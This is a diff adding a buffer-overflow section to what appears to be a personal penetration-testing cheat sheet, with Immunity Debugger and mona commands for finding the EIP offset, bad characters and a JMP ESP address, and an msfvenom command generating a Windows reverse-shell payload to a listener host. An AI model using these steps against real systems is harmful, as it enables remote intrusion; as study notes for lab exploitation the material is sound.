@@ -24,7 +24,36 @@
 - brute force: hydra
 - sqlmap
 
+# Buffer overflow
+- Upload file on Immunity Debugger (windows)
+  
+```
+!mona config -set workingfolder c:\Users\admin\Desktop\patota
+python -c 'print"A" * TOTAL'
+!mona findmsp -distance TOTAL 
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l TOTAL
+!mona findmsp -distance TOTAL
+```
 
+- EIP offset
+- Remove "A" from script + write BBB on "retn"
+
+```
+while bad_chars
+  !mona bytearray -b "\x00" = remove bad chars
+  strings.py = without bad chars
+  !mona compare -f c:\Users\admin\Desktop\patota\bytearray.bin  -a ESP-Address
+
+!mona jmp -r esp -cpb "Badchars"
+```
+
+- Copy address and write it backwards
+- Add padding: "\x90" * 16
+- Shell code msfvenom without bad chars
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=80 EXITFUNC=thread -b "\x00\x0a" -f c
+```
 ## Convert python
 dos2unix file
 
